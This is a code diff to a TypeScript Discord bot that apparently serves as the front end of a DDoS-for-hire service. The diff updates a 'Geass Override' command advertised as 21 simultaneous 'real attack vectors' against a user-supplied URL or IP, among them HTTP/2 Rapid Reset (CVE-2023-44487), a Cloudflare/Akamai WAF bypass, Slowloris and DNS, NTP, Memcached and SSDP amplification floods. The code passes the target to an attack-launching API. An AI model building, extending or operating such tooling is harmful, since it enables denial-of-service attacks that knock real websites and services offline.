@@ -39,7 +39,7 @@ if (!BOT_TOKEN) {
 // ── Method definitions with layer grouping for the select menu ──────────────
 const METHOD_OPTIONS = [
   // ── Geass / Special ────────────────────────────────────────────────────
-  { value: "geass-override",      label: "👁️ Geass Override ∞ [NOVEMDECIM]", description: "MAX POWER — 19 vectors (NOVEMDECIM ARES): ConnFlood+Slow+H2RST+H2CONT+HPACK+WAF+WS+GQL+RUDY2+Cache+TLS+QUIC+SSL+Storm+ICMP+DNS+NTP+Mem+SSDP", emoji: "👁️" },
+  { value: "geass-override",      label: "👁️ Geass Override ∞ [ARES 21v]",    description: "MAX POWER — 21 real vectors: ConnFlood+Slow+H2RST+H2CONT+HPACK+WAF+WS+GQL+UDP+RUDY2+Cache+TLS+QUIC+SSL+H2Storm+Pipeline+ICMP+DNS+NTP+Mem+SSDP", emoji: "👁️" },
   // ── L7 Application ─────────────────────────────────────────────────────
   { value: "waf-bypass",          label: "🟣 Geass WAF Bypass ∞",            description: "JA3+AKAMAI Chrome fingerprint — evades Cloudflare/Akamai WAF",                     emoji: "🟣" },
   { value: "http2-flood",         label: "⚡ HTTP/2 Rapid Reset",             description: "CVE-2023-44487 — 512-stream RST burst per session, millions req/s",               emoji: "⚡" },
@@ -146,7 +146,7 @@ const COMMANDS = [
 
   new SlashCommandBuilder()
     .setName("geass")
-    .setDescription("👁️ Launch Geass Override ∞ — VIGINTUS ARES maximum power, 20 simultaneous real attack vectors")
+    .setDescription("👁️ Launch Geass Override ∞ — ARES OMNIVECT maximum power, 21 simultaneous real attack vectors")
     .addStringOption(opt =>
       opt.setName("target").setDescription("Target URL or IP (e.g. https://example.com)").setRequired(true)
     )
@@ -532,16 +532,16 @@ async function handleGeass(interaction: ChatInputCommandInteraction): Promise<vo
         .setTitle("👁️ LELOUCH vi BRITANNIA COMMANDS YOU...")
         .setDescription(
           `> *"I, Lelouch vi Britannia, hereby command all opposition... TO SUBMIT!"*\n\n` +
-          `👁️ **GEASS OVERRIDE ∞ — VIGINTUS ARES** — **20** simultaneous real attack vectors against \`${target}\`\n\n` +
-          `**L7:** ConnFlood → Slowloris → H2RST(CVE-2023) → H2CONT(CVE-2024) → HPACK Bomb → WAF Bypass → WebSocket → RUDY v2 → Cache Poison → H2 Storm → Pipeline(300K/s)\n` +
-          `**L4/TLS:** TLS Renegotiation → QUIC/H3 → SSL Death\n` +
-          `**L3/UDP:** ICMP Flood → DNS Water Torture → NTP Flood → Memcached → SSDP`
+          `👁️ **GEASS OVERRIDE ∞ — ARES OMNIVECT** — **21** simultaneous real attack vectors against \`${target}\`\n\n` +
+          `**L7 (11):** ConnFlood → Slowloris → H2RST(CVE-2023) → H2CONT(CVE-2024) → HPACK Bomb → WAF Bypass → WebSocket → GraphQL → RUDY v2 → Cache Poison → H2 Storm\n` +
+          `**Pipeline+TLS+UDP (5):** HTTP Pipeline(300K/s) → TLS Renego → QUIC/H3 → SSL Death → UDP Flood\n` +
+          `**L3 (5):** ICMP Flood → DNS Water Torture → NTP Flood → Memcached → SSDP M-SEARCH`
         )
         .addFields(
           { name: "🎯 Target",   value: `\`${target}\``,        inline: true },
           { name: "⏱ Duration",  value: `**${duration}s**`,      inline: true },
           { name: "🧵 Threads",  value: `**${threads}** (base)`, inline: true },
-          { name: "📊 Status",   value: "🔴 **INITIALIZING 20 VECTORS — VIGINTUS ARES COMMAND...**", inline: false },
+          { name: "📊 Status",   value: "🔴 **INITIALIZING 21 VECTORS — ARES OMNIVECT COMMAND...**", inline: false },
         )
         .setFooter({ text: AUTHOR })
         .setTimestamp()
@@ -550,7 +550,7 @@ async function handleGeass(interaction: ChatInputCommandInteraction): Promise<vo
 
   try {
     const attack  = await api.startAttack({ target, method: "geass-override", threads, duration, port });
-    console.log(`[GEASS #${attack.id}] 19 Vectors online — NOVEMDECIM ARES → ${target}`);
+    console.log(`[GEASS #${attack.id}] 21 Vectors online — ARES OMNIVECT → ${target}`);
     const row     = buildAttackButtons(attack.id, true);
     const msg     = await interaction.editReply({ embeds: [buildStartEmbed(attack)], components: [row] });
     const userId  = interaction.user.id;
